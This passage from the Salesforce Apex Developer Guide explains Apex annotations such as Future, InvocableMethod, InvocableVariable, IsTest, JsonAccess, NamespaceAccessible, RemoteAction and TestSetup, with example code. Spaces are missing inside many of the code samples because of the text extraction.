that item in Apex is deprecated.
For more information about package versions, see What is a Package? on page 742.
Future Annotation
Use the Future annotation to identify methods that are executed asynchronously. When you specify Future, the method executes
when Salesforce has available resources.
For example, you can use the Future annotation when making an asynchronous Web service callout to an external service. Without
the annotation, the Web service callout is made from the same thread that is executing the Apex code, and no additional processing
can occur until the callout is complete (synchronous processing).
Methods with the Future annotation must be static methods, and can only return a void type. The specified parameters must be
primitive data types, arrays of primitive data types, or collections of primitive data types. Methods with the Future annotation can’t
take sObjects or objects as arguments.
To make a method in a class execute asynchronously, define the method with the Future annotation. For example:
globalclassMyFutureClass{
@Future
staticvoidmyMethod(Stringa, Integeri) {
System.debug('Methodcalledwith:' + a + ' and ' + i);
// Performlong-runningcode
}
}
To allow callouts in a Future method, specify (callout=true). The default is (callout=false), which prevents a method
from making callouts.
The following snippet shows how to specify that a method executes a callout:
@Future(callout=true)
publicstaticvoiddoCalloutFromFuture(){
//Addcodeto performcallout
}
Future Method Considerations
•
Remember that any method using the Future annotation requires special consideration because the method doesn’t necessarily
execute in the same order it’s called.
•
Methods with the Future annotation can’t be used in Visualforce controllers in either getMethodName or setMethodName
methods, nor in the constructor.
•
You can’t call a method annotated with Future from a method that also has the Future annotation. Nor can you call a trigger
from an annotated method that calls another annotated method.
InvocableMethod Annotation
Use the InvocableMethod annotation to identify methods that can be run as invocable actions.
95
Classes, Objects, and InterfacesApex Developer Guide

Note:  If a flow invokes Apex, the running user must have the corresponding Apex class security set in their user profile or permission
set.
Invocable methods are called natively from Rest, Apex, Flow, Agentforce agents or Einstein bots that interacts with the external API
source. Invocable methods have dynamic input and output values and support describe calls.
This code sample shows an invocable method with primitive data types.
publicclassAccountQueryAction{
@InvocableMethod(label='GetAccountNames'description='Returnsthe listof accountnames
correspondingto the specifiedaccountIDs.'category='Account')
publicstaticList<String> getAccountNames(List<ID> ids){
List<Account>accounts= [SELECTNameFROMAccountWHEREId in :ids];
Map<ID, String> idToName= new Map<ID, String>();
for (Accountaccount: accounts){
idToName.put(account.Id,account.Name);
}
// put eachnamein the outputat the samepositionas the id in the input
List<String> accountNames= new List<String>();
for (Stringid : ids){
accountNames.add(idToName.get(id));
}
returnaccountNames;
}
}
This code sample shows an invocable method with a specific sObject data type.
publicclassAccountInsertAction{
@InvocableMethod(label= 'InsertAccounts'description='Insertsthe accountsspecified
and returnsthe IDs of the new accountsor nullif accountis failedto create.'category
= 'Account')
publicstaticList<ID> insertAccounts(List<Account>accounts){
Database.SaveResult[]results= Database.insert(accounts,false);
List<ID> accountIds= new List<ID>();
for (Database.SaveResultresult: results){
if (result.isSuccess()){
accountIds.add(result.getId());
} else{
accountIds.add(null);
}
}
returnaccountIds;
}
}
This code sample shows an invocable method with the generic sObject data type.
publicwithsharingclassGetFirstFromCollection{
@InvocableMethod
publicstaticList<Results>execute(List<Requests>requestList){
List<Results>results= new List<Results>();
for (Requestsrequest: requestList){
List<SObject>inputCollection= request.inputCollection;
96
Classes, Objects, and InterfacesApex Developer Guide

SObjectoutputMember= inputCollection[0];
//Createa Resultsobjectto holdthe returnvalues
Resultsresult= new Results();
//Addthe returnvaluesto the Resultsobject
result.outputMember= outputMember;
//AddResultto the resultsListat the samepositionas the requestis in the
requestsList
results.add(result);
}
returnresults;
}
publicclassRequests{
@InvocableVariable(label='Recordsfor Input'description='yourDescription'required=true)
publicList<SObject>inputCollection;
}
publicclassResults{
@InvocableVariable(label='Recordsfor Output'description='yourDescription'
required=true)
publicSObjectoutputMember;
}
}
This code sample shows an invocable method with a custom icon from an SVG file.
globalclassCustomSvgIcon{
@InvocableMethod(label='myIcon'iconName='resource:myPackageNamespace__google:top')
globalstaticList<Integer>myMethod(List<Integer>request){
List<Integer>results= new List<Integer>();
for(IntegerreqInt: request){
results.add(reqInt);
}
returnresults;
}
}
This code sample shows an invocable method with a custom icon from the Salesforce Lightning Design System (SLDS).
publicclassCustomSldsIcon{
@InvocableMethod(iconName='slds:standard:choice')
publicstaticvoidrun(){}
}
To handle exceptions within an invocable method, wrap the results in an Apex object that reports failures. The execution of the invocable
method must run and return the same number of results as inputs received even if errors occur.
97
Classes, Objects, and InterfacesApex Developer Guide

For example, this code sample adjusts positive values by taking their square root and multiplying by pi, setting a success flag to true.
For negative values, it sets the success flag to false.
globalclassAdjustPositiveValuesAction{
@InvocableMethod(label='AdjustPositiveValues'description='Returnsthe listof adjusted
values.If a numberis negative,a failureis reportedfor thatvalue.')
publicstaticList<AdjustmentResult>doAdjustment(List<Double>values){
List<AdjustmentResult>results= new List<AdjustmentResult>();
for (Doublevalue: values){
AdjustmentResultresult= new AdjustmentResult();
try {
// Adjustthe value,scaleby pi.
// Note:If the valueis negative,thisoperationthrowsan exception.
result.adjustedValue= Math.sqrt(value)* Math.PI;
result.adjustmentSucceeded= true;
}
catch(Exceptione) {
// If a negativevaluecausedan exception,markthe adjustmentas failed,and keep
processingothervalues.
result.adjustmentSucceeded= false;
}
results.add(result);
}
returnresults;
}
globalclassAdjustmentResult{
@InvocableVariable(label='Trueif adjustmentsucceeded')
globalbooleanadjustmentSucceeded;
@InvocableVariable(label='Adjustedvalue,onlyvalidif adjustmentsucceeded')
globalDoubleadjustedValue;
}
}
This test method checks whether the value adjustments were successful and verifies the calculated values for positive inputs.
// Testclassfor AdjustPositiveValuesAction
@isTest
privateclassAdjustPositiveValuesActionTest{
privatestatictestMethodvoiddoTest(){
// Createa listof testvalues:4, -1, 1
List<Double>values= new List<Double>();
values.add(4);
values.add(-1);
values.add(1);
Test.startTest();
// Callthe doAdjustmentmethodwiththe testvalues.
98
Classes, Objects, and InterfacesApex Developer Guide

List<AdjustPositiveValuesAction.AdjustmentResult>results=
AdjustPositiveValuesAction.doAdjustment(values);
Test.stopTest();
// Assertionsto checkif adjustmentsweresuccessfulor not for eachinputvalue.
system.assertEquals(true,results[0].adjustmentSucceeded);
system.assertEquals(false,results[1].adjustmentSucceeded);
system.assertEquals(true,results[2].adjustmentSucceeded);
// Assertionsto checkthe calculatedadjustedvaluesfor positiveinputs.
system.assertEquals(2* Math.PI,results[0].adjustedValue);
system.assertEquals(Math.PI,results[2].adjustedValue);
}
}
Supported Modifiers
All modifiers are optional.
label
The label for the method, which appears as the action name in Flow Builder. The default is the method name, though we recommend
that you provide a label.
description
The description for the method, which appears as the action description in Flow Builder. The default is Null.
callout
The callout modifier identifies whether the method calls to an external system. If the method calls to an external system, add
callout=true. The default value is false.
capabilityType
The capability that integrates with the method. The valid format is Name://Name, for example:
PromptTemplateType://SalesEmail
category
The category for the method, which appears as the action category in Flow Builder. If no category is provided (by default), actions
appear under Uncategorized.
configurationEditor
The custom property editor that is registered with the method and appears in Flow Builder when an admin configures the action.
If you don’t specify this modifier, Flow Builder uses the standard property editor.
iconName
The name of the icon to use as a custom icon for the action in the Flow Builder canvas. You can specify an SVG file that you uploaded
as a static resource or a Salesforce Lightning Design System standard icon.
InvocableMethod Considerations
Implementation Notes
•
The invocable method must be static and public or global, and its class must be an outer class.
•
Only one method in a class can have the InvocableMethod annotation.
•
Other annotations can’t be used with the InvocableMethod annotation.
99
Classes, Objects, and InterfacesApex Developer Guide

Inputs and Outputs
There can be at most one input parameter and its data type must be one of the following:
•
A list of a primitive data type or a list of lists of a primitive data type – the generic Object type isn’t supported.
•
A list of an sObject type or a list of lists of an sObject type.
•
A list of the generic sObject type (List<sObject>) or a list of lists of the generic sObject type (List<List<sObject>>).
•
A list of a user-defined type, containing variables of the supported types or user-defined Apex types, with the
InvocableVariable annotation. To implement your data type, create a custom global or public Apex class. The class
must contain at least one member variable with the invocable variable annotation.
If the return type isn’t Null, the data type returned by the method must be one of the following:
•
A list of a primitive data type or a list of lists of a primitive data type – the generic Object type isn’t supported.
•
A list of an sObject type or a list of lists of an sObject type.
•
A list of the generic sObject type (List<sObject>) or a list of lists of the generic sObject type (List<List<sObject>>).
•
A list of a user-defined type, containing variables of the supported types or user-defined Apex types, with the
InvocableVariable annotation. To implement your data type, create a custom global or public Apex class. The class
must contain at least one member variable with the invocable variable annotation.
Note:  For a correct bulkification implementation, the Inputs and Outputs must match on both the size and the order. For
example, the i-th Output entry must correspond to the i-th Input entry. Matching entries are required for data correctness
when your action is in bulkified execution, such as when an apex action is used in a record trigger flow.
Managed Packages
•
You can use invocable methods in packages, but after you add an invocable method you can’t remove it from later versions of
the package.
•
Public invocable methods can be referred to by flows and processes within the managed package.
•
Global invocable methods can be referred to anywhere in the subscriber org. Only global invocable methods appear in Flow
Builder and Process Builder in the subscriber org.
For more information about invocable actions, see the Actions Developer Guide.
SEE ALSO:
InvocableVariable Annotation
Actions Developer Guide: Apex Actions
REST API Developer Guide: Invocable Actions
Salesforce Help: Add a Custom Icon to an Apex-Defined Action
Apex Reference Guide: Action Class
Lightning Web Components Developer Guide: Develop Custom Property Editors for Flow Builder
Prompt Builder: Ground with Apex
Making Callouts to External Systems from Invocable Actions
Customize Invocable Action Input Order in Flow Builder
InvocableVariable Annotation
To identify variables used by invocable methods in custom classes, use the InvocableVariable annotation.
100
Classes, Objects, and InterfacesApex Developer Guide

The InvocableVariable annotation identifies a class variable used as an input or output parameter for an InvocableMethod
method’s invocable action. If you create your own custom class to use as the input or output to an invocable method, you can annotate
individual class member variables to make them available to the method.
This code sample shows an invocable method with invocable variables.
globalclassConvertLeadAction{
@InvocableMethod(label='ConvertLeads')
globalstaticList<ConvertLeadActionResult>convertLeads(List<ConvertLeadActionRequest>
requests){
List<ConvertLeadActionResult>results= new List<ConvertLeadActionResult>();
for (ConvertLeadActionRequestrequest: requests){
results.add(convertLead(request));
}
returnresults;
}
publicstaticConvertLeadActionResultconvertLead(ConvertLeadActionRequestrequest){
Database.LeadConvertlc = new Database.LeadConvert();
lc.setLeadId(request.leadId);
lc.setConvertedStatus(request.convertedStatus);
if (request.accountId!= null) {
lc.setAccountId(request.accountId);
}
if (request.contactId!= null) {
lc.setContactId(request.contactId);
}
if (request.overWriteLeadSource!= null&& request.overWriteLeadSource){
lc.setOverwriteLeadSource(request.overWriteLeadSource);
}
if (request.createOpportunity!= null&& !request.createOpportunity){
lc.setDoNotCreateOpportunity(!request.createOpportunity);
}
if (request.opportunityName!= null) {
lc.setOpportunityName(request.opportunityName);
}
if (request.ownerId!= null) {
lc.setOwnerId(request.ownerId);
}
if (request.sendEmailToOwner!= null&& request.sendEmailToOwner){
lc.setSendNotificationEmail(request.sendEmailToOwner);
}
Database.LeadConvertResultlcr = Database.convertLead(lc,true);
if (lcr.isSuccess()){
ConvertLeadActionResultresult= new ConvertLeadActionResult();
result.accountId= lcr.getAccountId();
result.contactId= lcr.getContactId();
101
Classes, Objects, and InterfacesApex Developer Guide

result.opportunityId= lcr.getOpportunityId();
returnresult;
} else{
thrownew ConvertLeadActionException(lcr.getErrors()[0].getMessage());
}
}
globalclassConvertLeadActionRequest{
@InvocableVariable(required=true)
globalID leadId;
@InvocableVariable(required=true)
globalStringconvertedStatus;
@InvocableVariable
globalID accountId;
@InvocableVariable
globalID contactId;
@InvocableVariable
globalBooleanoverWriteLeadSource;
@InvocableVariable
globalBooleancreateOpportunity;
@InvocableVariable
globalStringopportunityName;
@InvocableVariable
globalID ownerId;
@InvocableVariable
globalBooleansendEmailToOwner;
}
globalclassConvertLeadActionResult{
@InvocableVariable
globalID accountId;
@InvocableVariable
globalID contactId;
@InvocableVariable
globalID opportunityId;
}
classConvertLeadActionExceptionextendsException{}
}
This code sample shows an invocable method with invocable variables that have the generic sObject data type.
publicwithsharingclassGetFirstFromCollection{
@InvocableMethod
publicstaticList<Results>execute(List<Requests>requestList){
102
Classes, Objects, and InterfacesApex Developer Guide

List<SObject>inputCollection= requestList[0].inputCollection;
SObjectoutputMember= inputCollection[0];
//Createa Resultsobjectto holdthe returnvalues
Resultsresponse= new Results();
//Addthe returnvaluesto the Resultsobject
response.outputMember= outputMember;
//Wrapthe Resultsobjectin a Listcontainer
//(anextrastepaddedto allowthisinterfaceto alsosupportbulkification)
List<Results>responseWrapper=new List<Results>();
responseWrapper.add(response);
returnresponseWrapper;
}
publicclassRequests{
@InvocableVariable(label='Recordsfor Input' description='yourDescription' required=true)
publicList<SObject>inputCollection;
}
publicclassResults{
@InvocableVariable(label='Recordsfor Output' description='yourDescription'
required=true)
publicSObjectoutputMember;
}
}
Supported Modifiers
All modifiers are optional.
Tip:  Default values, labels, and placeholder text appear in Flow Builder for the Action element that corresponds to an invocable
method. These modifiers help admins understand how to use variables in the flow.
defaultValue
Provide a vaule to the action at runtime, if no value is provided then these default values are provided to the action at runtime.
Valid invocable variable data types are:
•
Boolean - fields must have a value of 'true' or 'false' and case-insensitive.
@InvocableVariable(defaultValue='true')
publicBooleanmyBoolean;
•
Decimal - fields must have a value of 'validDecimalValue' where the floating point value can’t have a suffix.
@InvocableVariable(defaultValue='123.4')
publicDecimalmyDecimal;
•
Double - fields must have a value of 'validDoubleValue' where the d suffix is required and case-insensitive.
@InvocableVariable(defaultValue='867.3D')
publicDoublemyDouble;
103
Classes, Objects, and InterfacesApex Developer Guide

•
Integer - fields must have a value of 'validIntegerValue' where the inter value can’t have a suffix.
@InvocableVariable(defaultValue='-214')
publicIntegermyInteger;
•
Long - fields must have a value of 'validLongValue' where the l suffix is required and case-insensitive.
@InvocableVariable(defaultValue='922337L')
publicLongmyLong;
•
String - fields can use any valid string value including the empty string.
@InvocableVariable(defaultValue='helloworld!')
publicStringmyString;
description
The description for the variable. The default is Null.
label
The label for the variable. The default is the variable name.
placeholderText
Provides examples or additional guidance about the invocable variable, such as examples of values that can set the invocable variable.
Valid invocable variable data types are:
•
Double - fields must have a value of 'validDoubleValue' where the d suffix is required and case-insensitive.
•
Integer - fields must have a value of 'validIntegerValue' where the inter value can’t have a suffix.
•
String - fields can use any valid string value including the empty string.
required
Specifies whether the variable is required. If not specified, the default is false. The value is ignored for output variables.
Note:  The defaultValue modifier throws an error when used with required.
Example: The invocable variable annotation supports the modifiers shown in this example.
@InvocableVariable(label='yourLabel'
description='yourDescription' placeholderText='yourPlaceholderText'
required=(true| false))
The invocable variable annotation supports defaultValue in this example.
@InvocableVariable(defaultValue='yourDefaultValue')
globalStringcreateOpportunity;
InvocableVariable Considerations
•
Other annotations can’t be used with the InvocableVariable annotation.
•
Only global and public variables can be invocable variables.
•
The invocable variable can’t be any of these:
–
A non-member variable such as a static or local variable.
–
A property.
–
A final variable.
104
Classes, Objects, and InterfacesApex Developer Guide

–
Protected or private.
•
The data type of the invocable variable must be one of these:
–
A primitive other than Object
–
An sObject, either the generic sObject or a specific sObject
–
A list or a list of lists of primitives, sObjects, objects created from Apex classes, or collections
•
The invocable variable name in Apex must match the name in the flow. The name is case-sensitive.
•
For managed packages:
–
Public invocable variables can be set in flows and processes within the same managed package.
–
Global invocable variables can be set anywhere in the subscriber org. Only global invocable variables appear in Flow Builder and
Process Builder in the subscriber org.
SEE ALSO:
Apex Developer Guide: InvocableMethod Annotation
Apex Reference Guide: Action Class
Customize Invocable Action Input Order in Flow Builder
IsTest Annotation
Use the @IsTest annotation to define classes and methods that only contain code used for testing your application. The annotation
can take multiple modifiers within parentheses and separated by blanks.
Note:  The @IsTest annotation on methods is equivalent to the testMethod keyword. As best practice, Salesforce
recommends that you use @IsTest rather than testMethod. The testMethod keyword may be versioned out in a future
release.
Classes and methods that are defined as @IsTest can be either private or public. Classes defined as @IsTest must be
top-level classes.
Note:  Classes defined with the @IsTest annotation don't count against your organization limit of 6 MB for all Apex code.
Here’s an example of a private test class that contains two test methods.
@IsTest
privateclassMyTestClass{
// Methodsfor testing
@IsTest
staticvoidtest1(){
// Implementtestcode
}
@IsTest
staticvoidtest2(){
// Implementtestcode
}
}
105
Classes, Objects, and InterfacesApex Developer Guide

Here’s an example of a public test class that contains utility methods for test data creation:
@IsTest
publicclassTestUtil{
publicstaticvoidcreateTestAccounts(){
// Createsometestaccounts
}
publicstaticvoidcreateTestContacts(){
// Createsometestcontacts
}
}
Classes defined as @IsTest can't be interfaces or enums.
Methods of a public test class can only be called from a running test, that is, a test method or code invoked by a test method. Non-test
requests can’t call public methods.. To learn about the various ways you can run test methods, see Run Unit Test Methods.
@IsTest(SeeAllData=true) Annotation
For Apex code saved using Salesforce API version 24.0 and later, use the @IsTest(SeeAllData=true) annotation to grant test
classes and individual test methods access to all data in the organization. The access includes pre-existing data that the test didn’t create.
Starting with Apex code saved using Salesforce API version 24.0, test methods don’t have access to pre-existing data in the organization.
However, test code saved against Salesforce API version 23.0 and earlier continues to have access to all data in the organization. See
Isolation of Test Data from Organization Data in Unit Tests on page 711.
Considerations for the @IsTest(SeeAllData=true) Annotation
•
If a test class is defined with the @IsTest(SeeAllData=true) annotation, the SeeAllData=true applies to all
test methods that don’t explicitly set the SeeAllData keyword.
•
The @IsTest(SeeAllData=true) annotation is used to open up data access when applied at the class or method level.
However, if the containing class has been annotated with @IsTest(SeeAllData=true), annotating a method with
@IsTest(SeeAllData=false) is ignored for that method. In this case, that method still has access to all the data in
the organization. Annotating a method with @IsTest(SeeAllData=true) overrides, for that method, an
@IsTest(SeeAllData=false) annotation on the class.
•
@IsTest(SeeAllData=true) and @IsTest(IsParallel=true) annotations can’t be used together on the
same Apex method.
This example shows how to define a test class with the @IsTest(SeeAllData=true) annotation. All the test methods in this
class have access to all data in the organization.
// All testmethodsin thisclasscan accessall data.
@IsTest(SeeAllData=true)
publicclassTestDataAccessClass{
// Thistestaccessesan existingaccount.
// It alsocreatesand accessesa new testaccount.
@IsTest
staticvoidmyTestMethod1(){
// Queryan existingaccountin the organization.
Accounta = [SELECTId, NameFROMAccountWHEREName='Acme'LIMIT1];
System.assert(a!= null);
106
Classes, Objects, and InterfacesApex Developer Guide

// Createa testaccountbasedon the queriedaccount.
AccounttestAccount= a.clone();
testAccount.Name= 'AcmeTest';
inserttestAccount;
// Querythe testaccountthatwas inserted.
AccounttestAccount2= [SELECTId, NameFROMAccount
WHEREName='AcmeTest'LIMIT1];
System.assert(testAccount2!= null);
}
// Likethe previousmethod,thistestmethodcan alsoaccessall data
// becausethe containingclassis annotatedwith@IsTest(SeeAllData=true).
@IsTest
staticvoidmyTestMethod2(){
// Can accessall datain the organization.
}
}
This second example shows how to apply the @IsTest(SeeAllData=true) annotation on a test method. Because the test
method’s class isn’t annotated, you have to annotate the method to enable access to all data for the method. The second test method
doesn’t have this annotation, so it can access only the data it creates. In addition, it can access objects that are used to manage your
organization, such as users.
// Thisclasscontainstestmethodswithdifferentdataaccesslevels.
@IsTest
privateclassClassWithDifferentDataAccess{
// Testmethodthathas accessto all data.
@IsTest(SeeAllData=true)
staticvoidtestWithAllDataAccess(){
// Can queryall datain the organization.
}
// Testmethodthathas accessto onlythe datait creates
// and organizationsetupand metadataobjects.
@IsTest
staticvoidtestWithOwnDataAccess(){
// Thismethodcan stillaccessthe Userobject.
// Thisqueryreturnsthe firstuserobject.
Useru = [SELECTUserName,EmailFROMUserLIMIT1];
System.debug('UserName:' + u.UserName);
System.debug('Email:' + u.Email);
// Can accessthe testaccountthatis createdhere.
Accounta = new Account(Name='TestAccount');
inserta;
// Accessthe accountthatwas justcreated.
AccountinsertedAcct= [SELECTId,NameFROMAccount
WHEREName='TestAccount'];
System.assert(insertedAcct!= null);
107
Classes, Objects, and InterfacesApex Developer Guide

}
}
@IsTest(OnInstall=true) Annotation
Use the @IsTest(OnInstall=true) annotation to specify which Apex tests are executed during package installation. This
annotation is used for tests in managed or unmanaged packages. Only test methods with this annotation, or methods that are part of
a test class that has this annotation, are executed during package installation. Tests annotated to run during package installation must
pass in order for the package installation to succeed. It’s no longer possible to bypass a failing test during package installation. A test
method or a class that doesn't have this annotation, or that is annotated with @IsTest(OnInstall=false) or @IsTest, isn’t
executed during installation.
Tests annotated with IsTest(OnInstall=true) that run during package install and upgrade aren’t counted towards code
coverage. However, code coverage is tracked and counted during a package creation operation. Because Apex code installed from a
managed package is excluded from org level requirements for code coverage, it’s unlikely that you’re affected. But, if you track managed
package test coverage, you must rerun these tests outside of the package install or upgrade operation for code coverage statistics to be
updated. Package install isn’t blocked by code coverage requirements.
This example shows how to annotate a test method that is executed during package installation. In this example, test1 is executed
but test2 and test3 isn’t.
publicclassOnInstallClass{
// Implementlogicfor the class.
publicvoidmethod1(){
// Somecode
}
}
@IsTest
privateclassOnInstallClassTest{
// Thistestmethodwillbe executed
// duringthe installationof the package.
@IsTest(OnInstall=true)
staticvoidtest1(){
// Sometestcode
}
// Testsexcludedfromrunningduringthe
// the installationof a package.
@IsTest
staticvoidtest2(){
// Sometestcode
}
@IsTest
staticvoidtest3(){
// Sometestcode
}
}
@IsTest(IsParallel=true) Annotation
Use the @IsTest(IsParallel=true) annotation to indicate test classes that can run in parallel.
108
Classes, Objects, and InterfacesApex Developer Guide

Considerations for the @IsTest(IsParallel=true) annotation
•
This annotation forces the test to run in parallel even if the org-wide DisableParallelApexTesting option is
set.
•
@IsTest(SeeAllData=true) and @IsTest(IsParallel=true) annotations can’t be used together on the
same Apex method.
Restrictions on Apex tests using the @IsTest(IsParallel=true) annotation
•
Tests can’t call the Test.getStandardPricebookId()method.
•
Tests can’t call the System.schedule() and System.enqueueJob() methods.
•
Tests can’t insert a ContentNote SObject.
•
Tests can’t create User or GroupMember SObjects.
•
Tests can’t use the SObjects that are listed in sObjects That Can't Be Used Together in DML Operations.
JsonAccess Annotation
The @JsonAccess annotation defined at Apex class level controls whether instances of the class can be serialized or deserialized. If
the annotation restricts the JSON or XML serialization and deserialization, a runtime JSONException exception is thrown.
The serializable and deserializable parameters of the @JsonAccess annotation enforce the contexts in which Apex
allows serialization and deserialization. You can specify one or both parameters, but you can’t specify the annotation with no parameters.
The valid values for the parameters to indicate whether serialization and deserialization are allowed:
•
never: never allowed
•
sameNamespace: allowed only for Apex code in the same namespace
•
samePackage: allowed only for Apex code in the same package (impacts only second-generation packages)
•
always: always allowed for any Apex code
This example code shows an Apex class marked with the @JsonAccess annotation.
// SomeSerializableClassis serializablein the samepackageand deserializablein the
widernamespace
@JsonAccess(serializable='samePackage'deserializable='sameNamespace')
publicclassSomeSerializableClass{ }
// AlwaysDeserializableclassis alwaysdeserializableand serializableonlyin the same
namespace(defaultvaluefromversion49.0and later)
@JsonAccess(deserializable='always')
publicclassAlwaysDeserializable{ }
JsonAccess Considerations
•
If an Apex class annotated with JsonAccess is extended, the extended class doesn’t inherit this property.
•
If the toString method is applied on objects that mustn't be serialized, private data can be exposed. You must override the
toString method on objects whose data must be protected. For example, serializing an object stored as a key in a Map invokes
the toString method. The generated map includes key (string) and value entries, thus exposing all the fields of the object.
109
Classes, Objects, and InterfacesApex Developer Guide

Versioned Behavior Changes
In versions 48.0 and earlier, the default access for deserialization is always and the default access for serialization is sameNamespace
to preserve the existing behavior. From version 49.0 onwards, the default access for both serialization and deserialization is
sameNamespace.
NamespaceAccessible Annotation
The @NamespaceAccessible makes public Apex in a package available to other packages that use the same namespace. Without
this annotation, Apex classes, methods, interfaces, properties, and abstract classes defined in a 2GP package aren’t accessible to the
other packages with which they share a namespace. Apex that is declared global is always available across all namespaces, and needs
no annotation.
For more information on 2GP managed packages, see  Second-Generation Managed Packages in Salesforce DX Developer Guide.
Considerations for Apex Accessibility Across Packages
•
You can't use the @NamespaceAccessible annotation for an @AuraEnabled Apex method.
•
You can add or remove the @NamespaceAccessible annotation at any time, even on managed and released Apex code.
Make sure that you don’t have dependent packages relying on the functionality of the annotation before adding or removing it.
•
When adding or removing @NamespaceAccessible Apex from a package, consider the impact to customers with installed
versions of other packages that reference this package’s annotation. Before pushing a package upgrade, ensure that no customer
is running a package version that would fail to fully compile when the upgrade is pushed.
•
If a public interface is declared as @NamespaceAccessible, then all interface members inherit the annotation. Individual
interface members can’t be annotated with @NamespaceAccessible.
•
If a public or protected variable or method is declared as @NamespaceAccessible, its defining class must be either global or
public with the @NamespaceAccessible annotation.
•
If a public or protected inner class is declared as @NamespaceAccessible, its enclosing class must be either global or public
with the @NamespaceAccessible annotation.
This example shows an Apex class marked with the @NamespaceAccessible annotation. The class is accessible to other packages
within the same namespace. The first constructor is also visible within the namespace, but the second constructor isn’t.
// A namespace-visibleApexclass
@NamespaceAccessible
publicclassMyClass{
privateBooleanbypassFLS;
// A namespace-visibleconstructorthatonlyallowssecureuse
@NamespaceAccessible
publicMyClass(){
bypassFLS= false;
}
// A packageprivateconstructorthatallowsuse in trustedcontexts,
// but onlyinternalto the package
publicMyClass(BooleanbypassFLS){
this.bypassFLS= bypassFLS;
}
@NamespaceAccessible
protectedBooleangetBypassFLS(){
returnbypassFLS;
110
Classes, Objects, and InterfacesApex Developer Guide

}
}
Versioned Behavior Changes
In API version 47.0 and later, @NamespaceAccessible isn’t allowed on an entity marked with @AuraEnabled. Therefore, an
Aura or Lightning web component installed from a package can’t call an Apex method from another package, even if both packages
are in the same namespace. However, an @AuraEnabled public method from one package can call a @NamespaceAccessible
public method from another package in the same namespace.
Therefore, this behavior isn’t allowed.
// In Package1in the Acmenamespace
publicwithsharingclassMyController{
// Stackingtheseannotationsisn'tallowed
@AuraEnabled
@NamespaceAccessible
publicstaticvoidmyMethod(){
// ...
}
}
But this behavior is allowed.
// In Package1in the Acmenamespace
publicwithsharingclassService{
@NamespaceAccessible
publicstaticvoiddoSomething(){
// ...
}
}
// In Package2in the Acmenamespace
publicwithsharingclassMyController{
// Can callthe @NamespaceAccessiblemethod
@AuraEnabled
publicstaticvoidmyMethod(){
Service.doSomething();
}
}
In API version 50.0 and later, scope and accessibility rules are enforced on Apex variables, methods, inner classes, and interfaces that are
annotated with @NamespaceAccessible. For accessibility considerations, see Considerations for Apex Acessibility Across Packages.
For more information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages.
ReadOnly Annotation
The @ReadOnly annotation allows you to perform less restrictive queries against the Lightning Platform database by increasing the
limit of the number of returned rows for a request to 1,000,000. All other limits still apply. The annotation blocks the following operations
within the request: DML operations, calls to System.schedule, and enqueued asynchronous Apex jobs.
The @ReadOnly annotation is available for REST and SOAP Web services and the Schedulable interface. To use the @ReadOnly
annotation, the top-level request must be in the schedule execution or the Web service invocation. For example, if a Visualforce page
calls a Web service that contains the @ReadOnly annotation, the request fails because Visualforce is the top-level request, not the
Web service.
111
Classes, Objects, and InterfacesApex Developer Guide

Visualforce pages can call controller methods with the @ReadOnly annotation, and those methods run with the same relaxed
restrictions. To increase other Visualforce-specific limits, such as the size of a collection that can be used by an iteration component like
<apex:pageBlockTable>, you can set the readonly attribute on the <apex:page> tag to true. For more information,
see Working with Large Sets of Data in the Visualforce Developer's Guide.
Versioned Behavior Changes
Prior to API version 49.0, using @ReadOnly on Apex REST methods (@HttpDelete, @HttpGet, @HttpPatch, @HttpPost, or @HttpPut)
also required annotating the method with @RemoteAction. In API version 49.0 and later, you can annotate Apex REST methods
with just @ReadOnly.
RemoteAction Annotation
The RemoteAction annotation provides support for Apex methods used in Visualforce to be called via JavaScript. This process is
often referred to as JavaScript remoting.
Note:  Methods with the RemoteAction annotation must be static and either global or public.
Add the Apex class as a custom controller or a controller extension to your page.
<apex:pagecontroller="MyController"extension="MyExtension">
Warning:  Adding a controller or controller extension grants access to all @RemoteAction methods in that Apex class, even
if those methods aren’t used in the page. Anyone who can view the page can execute all @RemoteAction methods and
provide fake or malicious data to the controller.
Then, add the request as a JavaScript function call. A simple JavaScript remoting invocation takes the following form.
[namespace.]MyController.method(
[parameters...,]
callbackFunction,
[configuration]
);
Table 2: Remote Request Elements
DescriptionElement
The namespace of the controller class. The namespace element is required if your organization has
a namespace defined, or if the class comes from an installed package.
namespace
The name of your Apex controller or extension.MyController,
MyExtension
The name of the Apex method you’re calling.method
A comma-separated list of parameters that your method takes.parameters
The name of the JavaScript function that handles the response from the controller. You can also
declare an anonymous function inline. callbackFunction receives the status of the method
call and the result as parameters.
callbackFunction
Configures the handling of the remote call and response. Use this element to change the behavior
of a remoting call, such as whether to escape the Apex method’s response.
configuration
112
Classes, Objects, and InterfacesApex Developer Guide

In your controller, your Apex method declaration is preceded with the @RemoteAction annotation like this:
@RemoteAction
globalstaticStringgetItemId(StringobjectName){ ... }
Apex @RemoteAction methods must be static and either global or public.
Your method can take Apex primitives, collections, typed and generic sObjects, and user-defined Apex classes and interfaces as arguments.
Generic sObjects must have an ID or sobjectType value to identify actual type. Interface parameters must have an apexType to identify
actual type. Your method can return Apex primitives, sObjects, collections, user-defined Apex classes and enums, SaveResult,
UpsertResult, DeleteResult, SelectOption, or PageReference.
For more information, see “JavaScript Remoting for Apex Controllers” in the Visualforce Developer's Guide.
SuppressWarnings Annotation
This annotation does nothing in Apex but can be used to provide information to third-party tools.
The @SuppressWarnings annotation does nothing in Apex but can be used to provide information to third-party tools.
TestSetup Annotation
Methods defined with the @TestSetup annotation are used for creating common test records that are available for all test methods
in the class.
Syntax
Test setup methods are defined in a test class, take no arguments, and return no value. The following is the syntax of a test setup method.
@TestSetupstaticvoidmethodName() {
}
If a test class contains a test setup method, the testing framework executes the test setup method first, before any test method in the
class. Records that are created in a test setup method are available to all test methods in the test class and are rolled back at the end of
test class execution. If a test method changes those records, such as record field updates or record deletions, those changes are rolled
back after each test method finishes execution. The next executing test method gets access to the original unmodified state of those
records.
Note:  You can have only one test setup method per test class.
Test setup methods are supported only with the default data isolation mode for a test class. If the test class or a test method has access
to organization data by using the @IsTest(SeeAllData=true) annotation, test setup methods aren’t supported in this class.
Because data isolation for tests is available for API versions 24.0 and later, test setup methods are also available for those versions only.
For more information, see Using Test Setup Methods.
TestVisible Annotation
Use the TestVisible annotation to allow test methods to access private or protected members of another class outside the test
class. These members include methods, member variables, and inner classes. This annotation enables a more permissive access level
for running tests only. This annotation doesn’t change the visibility of members if accessed by non-test classes.
